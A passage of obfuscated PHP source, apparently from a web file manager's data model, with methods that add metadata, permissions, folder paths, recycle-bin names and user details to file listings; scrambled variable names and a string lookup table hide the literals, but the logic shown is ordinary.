ôÂóâ =& $_SERVER[£ğ°ÖØø]; $­éşˆˆ¨ = array($å ôÂóâ[500] => array($å ôÂóâ[501], $©ÀŒâµ˜)); $…Ø®¶¬Ì = Model($å ôÂóâ[544])->field($å ôÂóâ[545])->where($­éşˆˆ¨)->select(); if (!$…Ø®¶¬Ì) { return; } $˜âåÔª = array($å ôÂóâ[546], $å ôÂóâ[547], $å ôÂóâ[526]); $»±¦ê®¸ = array(); foreach ($…Ø®¶¬Ì as $Æ‹û…àş) { if (!isset($»±¦ê®¸[$Æ‹û…àş[$å ôÂóâ[193]]])) { $»±¦ê®¸[$Æ‹û…àş[$å ôÂóâ[193]]] = array(); } if (in_array($Æ‹û…àş[$å ôÂóâ[97]], $˜âåÔª)) { continue; } $»±¦ê®¸[$Æ‹û…àş[$å ôÂóâ[193]]][$Æ‹û…àş[$å ôÂóâ[97]]] = $Æ‹û…àş[$å ôÂóâ[459]]; } foreach ($Ûú¶Îñ as &$çÈ•ÉÑæ) { $çÈ•ÉÑæ[$å ôÂóâ[548]] = !1; if (isset($»±¦ê®¸[$çÈ•ÉÑæ[$å ôÂóâ[193]]])) { $çÈ•ÉÑæ[$å ôÂóâ[548]] = $»±¦ê®¸[$çÈ•ÉÑæ[$å ôÂóâ[193]]]; } if ($this->fileIsLock($çÈ•ÉÑæ) && $çÈ•ÉÑæ[$å ôÂóâ[496]]) { $‘¤÷ñºä = AuthModel::AUTH_EDIT | AuthModel::AUTH_REMOVE; $çÈ•ÉÑæ[$å ôÂóâ[496]][$å ôÂóâ[497]] = AuthModel::authDisable($çÈ•ÉÑæ[$å ôÂóâ[496]][$å ôÂóâ[497]], $‘¤÷ñºä); $çÈ•ÉÑæ[$å ôÂóâ[496]][$å ôÂóâ[549]][$å ôÂóâ[496]] = $çÈ•ÉÑæ[$å ôÂóâ[496]][$å ôÂóâ[497]]; } } unset($çÈ•ÉÑæ); } protected function _listAppendFileMeta(&$«¡†å¸î, $éúÅË—) { $øöËˆ™¡ =& $_SERVER[£ğ°ÖØø]; $üĞİæƒ‰ = array_to_keyvalue($«¡†å¸î, $øöËˆ™¡[12], $øöËˆ™¡[550]); $üĞİæƒ‰ = array_filter(array_unique($üĞİæƒ‰)); if (!$üĞİæƒ‰) { return; } $ËÄµ²¾ = array($øöËˆ™¡[551] => array($øöËˆ™¡[501], $üĞİæƒ‰)); $¬šÌØí = $øöËˆ™¡[552]; $•‚œŞñ = Model($øöËˆ™¡[553])->field($¬šÌØí)->where($ËÄµ²¾)->select(); $•‚œŞñ = array_to_keyvalue($•‚œŞñ, $øöËˆ™¡[550]); $»¯–ÙÔå = Model($øöËˆ™¡[554])->field($øöËˆ™¡[555])->where($ËÄµ²¾)->select(); $»¯–ÙÔå = $»¯–ÙÔå ? $»¯–ÙÔå : array(); $øÄßÅ¬² = array(); foreach ($»¯–ÙÔå as $¶½Õèú´) { if (!isset($øÄßÅ¬²[$¶½Õèú´[$øöËˆ™¡[550]]])) { $øÄßÅ¬²[$¶½Õèú´[$øöËˆ™¡[550]]] = array(); } $øÄßÅ¬²[$¶½Õèú´[$øöËˆ™¡[550]]][$¶½Õèú´[$øöËˆ™¡[97]]] = $¶½Õèú´[$øöËˆ™¡[459]]; } foreach ($«¡†å¸î as &$û§†¦€ù) { $¢ÕÑÜ¼º = $û§†¦€ù[$øöËˆ™¡[550]]; if (!$¢ÕÑÜ¼º || !is_array($•‚œŞñ[$¢ÕÑÜ¼º])) { continue; } $£â€şáÏ = $•‚œŞñ[$¢ÕÑÜ¼º]; $£â€şáÏ[$øöËˆ™¡[79]] = $û§†¦€ù[$øöËˆ™¡[79]]; $£â€şáÏ[$øöËˆ™¡[32]] = $û§†¦€ù[$øöËˆ™¡[32]]; if (!$£â€şáÏ[$øöËˆ™¡[556]]) { Model($øöËˆ™¡[553])->fileMd5Check($£â€şáÏ); } if (!isset(self::$cacheFileInfo[$øöËˆ™¡[557] . $¢ÕÑÜ¼º])) { self::$cacheFileInfo[$øöËˆ™¡[557] . $¢ÕÑÜ¼º] = array_merge(array(), $£â€şáÏ); } unset($•‚œŞñ[$¢ÕÑÜ¼º][$øöËˆ™¡[87]]); $Ô…’Ë = isset($øÄßÅ¬²[$¢ÕÑÜ¼º]) && is_array($øÄßÅ¬²[$¢ÕÑÜ¼º]) ? $øÄßÅ¬²[$¢ÕÑÜ¼º] : array(); $û§†¦€ù[$øöËˆ™¡[170]] = array_merge($Ô…’Ë, $•‚œŞñ[$¢ÕÑÜ¼º]); if (isset($û§†¦€ù[$øöËˆ™¡[170]][$øöËˆ™¡[184]])) { $û§†¦€ù[$øöËˆ™¡[184]] = json_decode($û§†¦€ù[$øöËˆ™¡[170]][$øöËˆ™¡[184]], !0); unset($û§†¦€ù[$øöËˆ™¡[170]][$øöËˆ™¡[184]]); } } unset($û§†¦€ù); } protected function _listAppendSourceInfo(&$¾›Üó¼Á, $ã’èÛë¿) { $Ñ¯ñÃˆı =& $_SERVER[£ğ°ÖØø]; $ß£„îóß = Model($Ñ¯ñÃˆı[558])->listData(); $ù‰áÆ‰™ = Model($Ñ¯ñÃˆı[508])->listData(); $‹×Ğ¼Ò° = Model($Ñ¯ñÃˆı[498])->listData(); $ùûò‡© = Model($Ñ¯ñÃˆı[559])->listSimple(); $ıÙ“—Àğ = array_to_keyvalue($ß£„îóß, $Ñ¯ñÃˆı[484]); $´óïúñ½ = array_to_keyvalue_group($ù‰áÆ‰™, $Ñ¯ñÃˆı[87], $Ñ¯ñÃˆı[509]); $Ö¸şş¾Ë = array_to_keyvalue($‹×Ğ¼Ò°, $Ñ¯ñÃˆı[87]); $€ò˜ÈÎ = array_to_keyvalue_group($ùûò‡©, $Ñ¯ñÃˆı[193]); foreach ($¾›Üó¼Á as &$ü„Å¶¼) { $ü„Å¶¼[$Ñ¯ñÃˆı[90]] = array($Ñ¯ñÃˆı[560] => 0, $Ñ¯ñÃˆı[561] => 0, $Ñ¯ñÃˆı[562] => 0); if (isset($Ö¸şş¾Ë[$ü„Å¶¼[$Ñ¯ñÃˆı[193]]])) { $ü„Å¶¼[$Ñ¯ñÃˆı[90]][$Ñ¯ñÃˆı[563]] = 1; $ü„Å¶¼[$Ñ¯ñÃˆı[90]][$Ñ¯ñÃˆı[564]] = $Ö¸şş¾Ë[$ü„Å¶¼[$Ñ¯ñÃˆı[193]]][$Ñ¯ñÃˆı[32]]; } if ($´óïúñ½ && $ıÙ“—Àğ && isset($´óïúñ½[$ü„Å¶¼[$Ñ¯ñÃˆı[193]]])) { $ü„Å¶¼[$Ñ¯ñÃˆı[90]][$Ñ¯ñÃˆı[565]] = array(); foreach ($´óïúñ½[$ü„Å¶¼[$Ñ¯ñÃˆı[193]]] as $µßÜå) { $ÛœÈü¡ = $ıÙ“—Àğ[$µßÜå]; $ü„Å¶¼[$Ñ¯ñÃˆı[90]][$Ñ¯ñÃˆı[565]][] = array($Ñ¯ñÃˆı[566] => $ÛœÈü¡[$Ñ¯ñÃˆı[484]], $Ñ¯ñÃˆı[503] => $ÛœÈü¡[$Ñ¯ñÃˆı[32]], $Ñ¯ñÃˆı[567] => $ÛœÈü¡[$Ñ¯ñÃˆı[568]]); } } if ($€ò˜ÈÎ && isset($€ò˜ÈÎ[$ü„Å¶¼[$Ñ¯ñÃˆı[193]]])) { $ü„Å¶¼[$Ñ¯ñÃˆı[90]][$Ñ¯ñÃˆı[569]] = array(); foreach ($€ò˜ÈÎ[$ü„Å¶¼[$Ñ¯ñÃˆı[193]]] as $Ü³ö«ÕÔ) { $À–ÛŒ‹« = $Ñ¯ñÃˆı[570]; if ($Ü³ö«ÕÔ[$Ñ¯ñÃˆı[571]] == $Ñ¯ñÃˆı[91]) { $À–ÛŒ‹« .= $Ñ¯ñÃˆı[572]; } $ü„Å¶¼[$Ñ¯ñÃˆı[90]][$Ñ¯ñÃˆı[569]] = array_field_key($Ü³ö«ÕÔ, explode($Ñ¯ñÃˆı[50], $À–ÛŒ‹«)); } } } unset($ü„Å¶¼); return $¾›Üó¼Á; } protected function _listAppendChildren(&$ïÓ¾Œ­å, $¹œï×Ñô) { $¾¦˜‹· =& $_SERVER[£ğ°ÖØø]; $¸ô¦¸®È = array(); $Û£«¼‹ì = array($¾¦˜‹·[239] => 0, $¾¦˜‹·[240] => 0); foreach ($ïÓ¾Œ­å as &$¥×ˆÆƒ) { if (!$¥×ˆÆƒ[$¾¦˜‹·[494]]) { continue; } $¸ô¦¸®È[] = $¥×ˆÆƒ[$¾¦˜‹·[193]]; } unset($¥×ˆÆƒ); if (!$¸ô¦¸®È) { return; } $ŒÈÔÚ¥ = array($¾¦˜‹·[192] => array($¾¦˜‹·[7], $¸ô¦¸®È), $¾¦˜‹·[514] => 0); $ İ‹»µº = array($¾¦˜‹·[192], $¾¦˜‹·[494], $¾¦˜‹·[573] => $¾¦˜‹·[574]); $ÕúŠö‘À = $this->field($ İ‹»µº)->where($ŒÈÔÚ¥)->group($¾¦˜‹·[575])->select(); $õ’—ÎØ™ = array(); foreach ($ÕúŠö‘À as $²ªÌëó) { $„Ö±óêö = $²ªÌëó[$¾¦˜‹·[192]]; $ÆÆÖæ = $²ªÌëó[$¾¦˜‹·[494]] == $¾¦˜‹·[91] ? $¾¦˜‹·[240] : $¾¦˜‹·[239]; if (!isset($õ’—ÎØ™[$„Ö±óêö])) { $õ’—ÎØ™[$„Ö±óêö] = array($¾¦˜‹·[239] => 0, $¾¦˜‹·[240] => 0); } $õ’—ÎØ™[$„Ö±óêö][$ÆÆÖæ] += $²ªÌëó[$¾¦˜‹·[574]]; } foreach ($ïÓ¾Œ­å as &$¥×ˆÆƒ) { if (!$¥×ˆÆƒ[$¾¦˜‹·[494]]) { continue; } $éĞóÖåË = is_array($õ’—ÎØ™[$¥×ˆÆƒ[$¾¦˜‹·[193]]]) ? $õ’—ÎØ™[$¥×ˆÆƒ[$¾¦˜‹·[193]]] : $Û£«¼‹ì; $¥×ˆÆƒ[$¾¦˜‹·[240]] = $éĞóÖåË[$¾¦˜‹·[240]]; $¥×ˆÆƒ[$¾¦˜‹·[239]] = $éĞóÖåË[$¾¦˜‹·[239]]; unset($¥×ˆÆƒ[$¾¦˜‹·[495]]); } unset($¥×ˆÆƒ); } protected function _listAppendAuth(&$ä€‚â) { $Ù¥çíæ­ =& $_SERVER[£ğ°ÖØø]; $æÚâì¨ = array(); foreach ($ä€‚â as $ô“ˆ®Õ¹) { if ($ô“ˆ®Õ¹[$Ù¥çíæ­[190]] == self::TYPE_GROUP) { $æÚâì¨[] = $ô“ˆ®Õ¹[$Ù¥çíæ­[193]]; } } if (!$æÚâì¨) { return; } $¨…“ºâ¬ = array_to_keyvalue($ä€‚â, $Ù¥çíæ­[193]); $ç©ãâ´¸ = Model($Ù¥çíæ­[576])->getSourceList($æÚâì¨, $¨…“ºâ¬); $Ñå’ìÎ¢ = KodUser::isRoot(); foreach ($ä€‚â as $Ô¿Å‘åÆ => &$ô“ˆ®Õ¹) { $ô“ˆ®Õ¹[$Ù¥çíæ­[496]] = $ç©ãâ´¸[$ô“ˆ®Õ¹[$Ù¥çíæ­[193]]]; if (!$ô“ˆ®Õ¹[$Ù¥çíæ­[496]] && $ô“ˆ®Õ¹[$Ù¥çíæ­[190]] == self::TYPE_GROUP) { $ô“ˆ®Õ¹[$Ù¥çíæ­[496]] = Action($Ù¥çíæ­[577])->pathGroupAuthMake($ô“ˆ®Õ¹[$Ù¥çíæ­[578]]); if (!$ô“ˆ®Õ¹[$Ù¥çíæ­[496]] && !$Ñå’ìÎ¢) { $ô“ˆ®Õ¹[$Ù¥çíæ­[233]] = !1; $ô“ˆ®Õ¹[$Ù¥çíæ­[232]] = !1; } } if ($ô“ˆ®Õ¹[$Ù¥çíæ­[496]]) { $ô“ˆ®Õ¹[$Ù¥çíæ­[233]] = AuthModel::authCheckEdit($ô“ˆ®Õ¹[$Ù¥çíæ­[496]][$Ù¥çíæ­[497]]); $ô“ˆ®Õ¹[$Ù¥çíæ­[232]] = AuthModel::authCheckView($ô“ˆ®Õ¹[$Ù¥çíæ­[496]][$Ù¥çíæ­[497]]); } $this->groupPathDisplay($ô“ˆ®Õ¹); } unset($ô“ˆ®Õ¹); } public function _listAppendAuthSecret(&$ı¨¸Ï‚÷) { $€ò¶¹ • =& $_SERVER[£ğ°ÖØø]; if (Model($€ò¶¹ •[517])->get($€ò¶¹ •[579]) != $€ò¶¹ •[91]) { return; } static $ù°•øÏÕ = false; if (!$ù°•øÏÕ) { $ÑÂÙÀÑò = Model($€ò¶¹ •[580]); $‘ıÚ°¦ = Model($€ò¶¹ •[581]); $ù°•øÏÕ = $‘ıÚ°¦->listData(); $ù°•øÏÕ = array_to_keyvalue($ù°•øÏÕ, $€ò¶¹ •[193]); $ù†ÅÅŸ = json_decode(Model($€ò¶¹ •[517])->get($€ò¶¹ •[582]), !0); $ù†ÅÅŸ = array_to_keyvalue($ù†ÅÅŸ, $€ò¶¹ •[484]); foreach ($ù°•øÏÕ as $ÌÍœÖ€ => $ÅÌ­ş¶Š) { $Ó÷©‡àÌ = $ù†ÅÅŸ[$ÅÌ­ş¶Š[$€ò¶¹ •[583]]]; if (!$Ó÷©‡àÌ) { $‘ıÚ°¦->remove($ÅÌ­ş¶Š[$€ò¶¹ •[484]]); unset($ù°•øÏÕ[$ÌÍœÖ€]); continue; } $ßãŸ×ÆÆ = $ÑÂÙÀÑò->listData($Ó÷©‡àÌ[$€ò¶¹ •[496]]); if (!$ßãŸ×ÆÆ) { $‘ıÚ°¦->remove($ÅÌ­ş¶Š[$€ò¶¹ •[484]]); unset($ù°•øÏÕ[$ÌÍœÖ€]); continue; } $ÅÌ­ş¶Š[$€ò¶¹ •[496]] = $ßãŸ×ÆÆ; $ÅÌ­ş¶Š[$€ò¶¹ •[584]] = $Ó÷©‡àÌ; $ÅÌ­ş¶Š[$€ò¶¹ •[585]] = Model($€ò¶¹ •[586])->getInfoSimpleOuter($ÅÌ­ş¶Š[$€ò¶¹ •[536]]); $ù°•øÏÕ[$ÌÍœÖ€] = $ÅÌ­ş¶Š; } } $µºªÆÌØ = USER_ID; $Â‚Úª‰ = array(); $Ÿ»æ„èÃ = $this->_listAppendPath($Â‚Úª‰, !0); foreach ($ı¨¸Ï‚÷ as $ÌÍœÖ€ => &$ÅÌ­ş¶Š) { if (!is_array($ÅÌ­ş¶Š[$€ò¶¹ •[496]])) { continue; } if ($ÅÌ­ş¶Š[$€ò¶¹ •[190]] != $€ò¶¹ •[587]) { continue; } if (isset($ù°•øÏÕ[$ÅÌ­ş¶Š[$€ò¶¹ •[193]]])) { $¡ÛòÈÆ… = $ù°•øÏÕ[$ÅÌ­ş¶Š[$€ò¶¹ •[193]]]; if (!is_array($ÅÌ­ş¶Š[$€ò¶¹ •[548]])) { $ÅÌ­ş¶Š[$€ò¶¹ •[548]] = array(); } $ÅÌ­ş¶Š[$€ò¶¹ •[548]][$€ò¶¹ •[588]] = $¡ÛòÈÆ…[$€ò¶¹ •[583]]; $ÅÌ­ş¶Š[$€ò¶¹ •[496]][$€ò¶¹ •[589]] = $¡ÛòÈÆ…; $ÅÌ­ş¶Š[$€ò¶¹ •[496]][$€ò¶¹ •[590]] = $ÅÌ­ş¶Š[$€ò¶¹ •[591]]; $ÅÌ­ş¶Š[$€ò¶¹ •[496]][$€ò¶¹ •[592]] = $€ò¶¹ •[91]; if ($¡ÛòÈÆ…[$€ò¶¹ •[536]] != $µºªÆÌØ) { $ÅÌ­ş¶Š[$€ò¶¹ •[496]][$€ò¶¹ •[497]] = $ÅÌ­ş¶Š[$€ò¶¹ •[496]][$€ò¶¹ •[497]] & $¡ÛòÈÆ…[$€ò¶¹ •[496]][$€ò¶¹ •[496]]; } continue; } $¾ş¤ıÊ× = $this->parentLevelArray($ÅÌ­ş¶Š[$€ò¶¹ •[593]]); $€ô¢Ê² = array_reverse($¾ş¤ıÊ×); foreach ($€ô¢Ê² as $ê·ºŠ—ñ => $Ö‘üúî¨) { if (!isset($ù°•øÏÕ[$Ö‘üúî¨])) { continue; } $¡ÛòÈÆ… = $ù°•øÏÕ[$Ö‘üúî¨]; $ÅÌ­ş¶Š[$€ò¶¹ •[496]][$€ò¶¹ •[589]] = $¡ÛòÈÆ…; if ($¡ÛòÈÆ…[$€ò¶¹ •[536]] != $µºªÆÌØ) { $ÅÌ­ş¶Š[$€ò¶¹ •[496]][$€ò¶¹ •[497]] = $ÅÌ­ş¶Š[$€ò¶¹ •[496]][$€ò¶¹ •[497]] & $¡ÛòÈÆ…[$€ò¶¹ •[496]][$€ò¶¹ •[496]]; } $ËÔ’¼ûí = $€ò¶¹ •[12]; $Ñá—Üı³ = count($¾ş¤ıÊ×) - $ê·ºŠ—ñ; for ($±èÀüæº = 0; $±èÀüæº < $Ñá—Üı³; $±èÀüæº++) { if (!isset($Ÿ»æ„èÃ[$¾ş¤ıÊ×[$±èÀüæº]])) { $ËÔ’¼ûí = $€ò¶¹ •[12]; break; } $ËÔ’¼ûí = $ËÔ’¼ûí . rtrim($Ÿ»æ„èÃ[$¾ş¤ıÊ×[$±èÀüæº]], $€ò¶¹ •[8]) . $€ò¶¹ •[8]; } $ÅÌ­ş¶Š[$€ò¶¹ •[496]][$€ò¶¹ •[590]] = rtrim($ËÔ’¼ûí, $€ò¶¹ •[8]) . $€ò¶¹ •[8]; break; } } unset($ÅÌ­ş¶Š); } public function groupPathDisplay(&$ÔšËÅØÍ) { $¢ğ…éÁ„ =& $_SERVER[£ğ°ÖØø]; if ($ÔšËÅØÍ[$¢ğ…éÁ„[190]] != self::TYPE_GROUP) { return; } $ô¡â•²² = Model($¢ğ…éÁ„[594])->getInfo($ÔšËÅØÍ[$¢ğ…éÁ„[578]]); $í™õÖ¤í = $this->parentLevelArray($ô¡â•²²[$¢ğ…éÁ„[593]]); $ªíÕ”˜ë = $¢ğ…éÁ„[12]; foreach ($í™õÖ¤í as $ŒÄ†©«á) { $¹÷Æô º = Model($¢ğ…éÁ„[594])->getInfo($ŒÄ†©«á); $ªíÕ”˜ë .= $¹÷Æô º[$¢ğ…éÁ„[90]][$¢ğ…éÁ„[193]] . $¢ğ…éÁ„[50]; } $ÔšËÅØÍ[$¢ğ…éÁ„[595]] = $ô¡â•²²[$¢ğ…éÁ„[192]]; $ÔšËÅØÍ[$¢ğ…éÁ„[596]] = $ô¡â•²²[$¢ğ…éÁ„[593]]; $ÔšËÅØÍ[$¢ğ…éÁ„[597]] = $ô¡â•²²[$¢ğ…éÁ„[598]]; $ÔšËÅØÍ[$¢ğ…éÁ„[599]] = $ªíÕ”˜ë . $ô¡â•²²[$¢ğ…éÁ„[90]][$¢ğ…éÁ„[193]]; } protected function _listAppendPath(&$ÆèµšÍÛ, $‚òÇÜ¸ = false) { $™õˆˆÖŸ =& $_SERVER[£ğ°ÖØø]; static $ô•Â Ş¨ = array(); $é·ÒºóŠ = array(); $÷˜Úú = array(); if ($‚òÇÜ¸) { return $ô•Â Ş¨; } foreach ($ÆèµšÍÛ as &$÷™‘ª…õ) { $ãéñ«Ú¼ = $÷™‘ª…õ[$™õˆˆÖŸ[193]]; if ($÷™‘ª…õ[$™õˆˆÖŸ[494]] == $™õˆˆÖŸ[91] && $÷™‘ª…õ[$™õˆˆÖŸ[192]] != 0) { $ô•Â Ş¨[$ãéñ«Ú¼] = $÷™‘ª…õ[$™õˆˆÖŸ[32]]; } if ($÷™‘ª…õ[$™õˆˆÖŸ[494]] == $™õˆˆÖŸ[91] && $÷™‘ª…õ[$™õˆˆÖŸ[192]] == 0) { $ô•Â Ş¨[$ãéñ«Ú¼] = $this->_listAppendPathRoot($÷™‘ª…õ, array()); } if (isset($÷˜Úú[$÷™‘ª…õ[$™õˆˆÖŸ[593]]])) { continue; } $÷˜Úú[$÷™‘ª…õ[$™õˆˆÖŸ[593]]] = !0; $¡ş´ÉƒÆ = $this->parentLevelArray($÷™‘ª…õ[$™õˆˆÖŸ[593]]); foreach ($¡ş´ÉƒÆ as $ôıàÔâ => $ŒŸú¤³¼) { if (isset($ô•Â Ş¨[$ŒŸú¤³¼])) { continue; } if ($ôıàÔâ == 0) { $ô•Â Ş¨[$ŒŸú¤³¼] = $this->_listAppendPathRoot($÷™‘ª…õ, $¡ş´ÉƒÆ); } if ($ôıàÔâ != 0) { $é·ÒºóŠ[] = $ŒŸú¤³¼; } } } unset($÷™‘ª…õ); $é·ÒºóŠ = array_unique($é·ÒºóŠ); if (count($é·ÒºóŠ) > 0) { $ÍÑ—–Í½ = array($™õˆˆÖŸ[500] => array($™õˆˆÖŸ[501], $é·ÒºóŠ)); if (count($é·ÒºóŠ) == 1) { $‹ëç¡Ûè = $this->sourceInfo($é·ÒºóŠ[0]); $ÁÙßöÄÈ = is_array($‹ëç¡Ûè) ? array($‹ëç¡Ûè) : !1; } else { $ÁÙßöÄÈ = $this->field($™õˆˆÖŸ[600])->where($ÍÑ—–Í½)->select(); } if (!$ÁÙßöÄÈ) { $ÁÙßöÄÈ = array(); } foreach ($ÁÙßöÄÈ as $ŠêÄÌ›ß) { $ô•Â Ş¨[$ŠêÄÌ›ß[$™õˆˆÖŸ[193]]] = $ŠêÄÌ›ß[$™õˆˆÖŸ[32]]; } } $ª©ÛçûÛ = KodIO::sourceID(IO_PATH_SYSTEM_RECYCLE); $ÖÑşñî = array(); foreach ($ÆèµšÍÛ as &$÷™‘ª…õ) { $×ŞâÕÈØ = $÷™‘ª…õ[$™õˆˆÖŸ[593]]; $²ä±‘üŠ = $™õˆˆÖŸ[12]; if (isset($ÖÑşñî[$×ŞâÕÈØ])) { $²ä±‘üŠ = $ÖÑşñî[$×ŞâÕÈØ]; } else { $¡ş´ÉƒÆ = $this->parentLevelArray($÷™‘ª…õ[$™õˆˆÖŸ[593]]); foreach ($¡ş´ÉƒÆ as $ôıàÔâ => $ŒŸú¤³¼) { if (isset($ô•Â Ş¨[$ŒŸú¤³¼])) { $²ä±‘üŠ .= $ô•Â Ş¨[$ŒŸú¤³¼] . $™õˆˆÖŸ[8]; } } $ÖÑşñî[$×ŞâÕÈØ] = $²ä±‘üŠ; } $²ä±‘üŠ .= $÷™‘ª…õ[$™õˆˆÖŸ[32]]; if ($÷™‘ª…õ[$™õˆˆÖŸ[494]] == $™õˆˆÖŸ[91]) { $²ä±‘üŠ .= $™õˆˆÖŸ[8]; } $÷™‘ª…õ[$™õˆˆÖŸ[591]] = str_replace($™õˆˆÖŸ[601], $™õˆˆÖŸ[8], $²ä±‘üŠ); if ($÷™‘ª…õ[$™õˆˆÖŸ[192]] == $™õˆˆÖŸ[228]) { $÷™‘ª…õ[$™õˆˆÖŸ[32]] = trim($ô•Â Ş¨[$÷™‘ª…õ[$™õˆˆÖŸ[193]]], $™õˆˆÖŸ[8]); $÷™‘ª…õ[$™õˆˆÖŸ[591]] = $÷™‘ª…õ[$™õˆˆÖŸ[32]] . $™õˆˆÖŸ[8]; } if (intval($÷™‘ª…õ[$™õˆˆÖŸ[190]]) == self::TYPE_SYSTEM) { $this->_listAppendPathRecycle($÷™‘ª…õ, $¡ş´ÉƒÆ, $ª©ÛçûÛ); } } unset($÷™‘ª…õ); return $ÆèµšÍÛ; } private function _listAppendPathRecycle(&$ñ»Ú÷¼ã, $‡–ºÓ, $œœÈ¾–Ş) { $ÂšòÁÕó =& $_SERVER[£ğ°ÖØø]; if (!in_array($œœÈ¾–Ş, $‡–ºÓ) && $ñ»Ú÷¼ã[$ÂšòÁÕó[193]] != $œœÈ¾–Ş) { return; } $åˆ‘¬„ = explode($ÂšòÁÕó[8], trim($ñ»Ú÷¼ã[$ÂšòÁÕó[591]], $ÂšòÁÕó[8])); $ßËöËóå = implode($ÂšòÁÕó[8], array_slice($åˆ‘¬„, 2)); $ñ»Ú÷¼ã[$ÂšòÁÕó[591]] = $ÂšòÁÕó[8] . LNG($ÂšòÁÕó[602]) . $ÂšòÁÕó[8] . ltrim($ßËöËóå, $ÂšòÁÕó[8]); $ñ»Ú÷¼ã[$ÂšòÁÕó[593]] = $ÂšòÁÕó[603] . implode($ÂšòÁÕó[50], array_slice($‡–ºÓ, 1)) . $ÂšòÁÕó[50]; if ($ñ»Ú÷¼ã[$ÂšòÁÕó[193]] == $œœÈ¾–Ş) { $ñ»Ú÷¼ã[$ÂšòÁÕó[593]] = $ÂšòÁÕó[603]; $ñ»Ú÷¼ã[$ÂšòÁÕó[192]] = $ÂšòÁÕó[228]; $ñ»Ú÷¼ã[$ÂšòÁÕó[32]] = LNG($ÂšòÁÕó[602]); } $ñ»Ú÷¼ã[$ÂšòÁÕó[604]] = $ÂšòÁÕó[605]; } protected function _listAppendPathRoot(&$ÚóĞîé¹, $¢‚‚è‡š) { $ÊĞÚè¤ =& $_SERVER[£ğ°ÖØø]; static $ıÕ÷˜º = false; $Éğ…äÈ¹ = $ÊĞÚè¤[12]; if ($ÚóĞîé¹[$ÊĞÚè¤[190]] == self::TYPE_USER) { if ($ÚóĞîé¹[$ÊĞÚè¤[578]] == USER_ID) { $Éğ…äÈ¹ = LNG($ÊĞÚè¤[606]); if ($ıÕ÷˜º === !1) { $ÑÒ°À¨Á = Model($ÊĞÚè¤[607])->getInfoFull(USER_ID); $ıÕ÷˜º = _get($ÑÒ°À¨Á, $ÊĞÚè¤[608], $ÊĞÚè¤[12]); } if ($¢‚‚è‡š && $¢‚‚è‡š[0] == $ıÕ÷˜º || !$¢‚‚è‡š && $ÚóĞîé¹[$ÊĞÚè¤[193]] == $ıÕ÷˜º) { $Éğ…äÈ¹ = LNG($ÊĞÚè¤[609]); $ÚóĞîé¹[$ÊĞÚè¤[610]] = $ÊĞÚè¤[611]; } if (!$¢‚‚è‡š) { $ÚóĞîé¹[$ÊĞÚè¤[32]] = $Éğ…äÈ¹; } } else { $ÚóĞîé¹[$ÊĞÚè¤[612]] = Model($ÊĞÚè¤[586])->getInfoSimpleOuter($ÚóĞîé¹[$ÊĞÚè¤[578]]); $Éğ…äÈ¹ = LNG($ÊĞÚè¤[613]) . $ÊĞÚè¤[176] . $ÚóĞîé¹[$ÊĞÚè¤[612]][$ÊĞÚè¤[32]] . $ÊĞÚè¤[178]; } } else { if ($ÚóĞîé¹[$ÊĞÚè¤[190]] == self::TYPE_GROUP) { $”ÆÁ€ª… = Model($ÊĞÚè¤[594])->getInfoSimple($ÚóĞîé¹[$ÊĞÚè¤[578]]); $Éğ…äÈ¹ = $”ÆÁ€ª…[$ÊĞÚè¤[32]]; } else { if ($ÚóĞîé¹[$ÊĞÚè¤[190]] == self::TYPE_SYSTEM) { $Éğ…äÈ¹ = $ÊĞÚè¤[614]; } } } $Éğ…äÈ¹ = $Éğ…äÈ¹ ? $ÊĞÚè¤[8] . $Éğ…äÈ¹ . $ÊĞÚè¤[8] : $ÊĞÚè¤[8]; return $Éğ…äÈ¹; } protected function _listAppendUser(&$Ë”…£àÆ) { $óœàçÌå =& $_SERVER[£ğ°ÖØø]; $–ªÂ´êì = array_to_keyvalue($Ë”…£àÆ, $óœàçÌå[12], $óœàçÌå[536]); $Šî©ÕÈ = array_to_keyvalue($Ë”…£àÆ, $óœàçÌå[12], $óœàçÌå[538]); $éñ¡ÙİŠ = array_merge($–ªÂ´êì, $Šî©ÕÈ); $éŸ€Å±’ = Model($óœàçÌå[607])->userListInfo($éñ¡ÙİŠ); foreach ($Ë”…£àÆ as &$üÈ­Îå) { $§Ğêï÷… = $üÈ­Îå[$óœàçÌå[536]]; $üÈ­Îå[$óœàçÌå[536]] = $éŸ€Å±’[$§Ğêï÷…] ? $éŸ€Å±’[$§Ğêï÷…] : !1; $§Ğêï÷… = $üÈ­Îå[$óœàçÌå[538]]; $üÈ­Îå[$óœàçÌå[538]] = $éŸ€Å±’[$§Ğêï÷…] ? $éŸ€Å±’[$§Ğêï÷…] : !1; if (_get($üÈ­Îå, $óœàçÌå[615], 0)) { $Ã Èü¼Ş = $GLOBALS[$óœàçÌå[6]][$óœàçÌå[92]][$óœàçÌå[616]]; if ($üÈ­Îå[$óœàçÌå[548]][$óœàçÌå[617]] <= time() - $Ã Èü¼Ş) { $this->metaSet($üÈ­Îå[$óœàçÌå[193]], $óœàçÌå[618], null); $this->metaSet($üÈ­Îå[$óœàçÌå[193]], $óœàçÌå[617], null); unset($üÈ­Îå[$óœàçÌå[548]][$óœàçÌå[618]]); continue; } $Õ£Ğ·Œé = $üÈ­Îå[$óœàçÌå[548]][$óœàçÌå[618]]; $üÈ­Îå[$óœàçÌå[548]][$óœàçÌå[619]] = Model($óœàçÌå[607])->getInfoSimpleOuter($Õ£Ğ·Œé); } } unset($üÈ­Îå); } public function parentLevelArray($§¦Í³¦ß) { $ÉÜåô³ =& $_SERVER[£ğ°ÖØø]; $§¦Í³¦ß = explode($ÉÜåô³[50], trim($§¦Í³¦ß, $ÉÜåô³[50])); return array_remove_value($§¦Í³¦ß, $ÉÜåô³[228]); } public function listAll($Îııµ™Ÿ) { $›†óã¯ş =& $_SERVER[£ğ°ÖØø]; $£–òÕÀˆ = $this->sourceInfo($Îııµ™Ÿ); $Û†ÊÒ±† = array($›†óã¯ş[620] => array($›†óã¯ş[621], $£–òÕÀˆ[$›†óã¯ş[593]] . $Îııµ™Ÿ . $›†óã¯ş[622]), $›†óã¯ş[623] => 0); $Ã²€Åˆ = $›†óã¯ş[624]; $ó¡¯şù‹ = "\x4c\105\x46\x54\x20\112\117\111\116\x20{$this->tablePrefix}\x69\x6f\x5f\146\x69\154\145\40\x66\x69\x6c\x65\x20\x6f\x6e\40\x73\x6f\x75\162\143\x65\x2e\146\151\x6c\145\x49\104\x20\75\x20\146\x69\x6c\x65\56\x66\151\154\145\x49\104"; $¼—•âĞã = 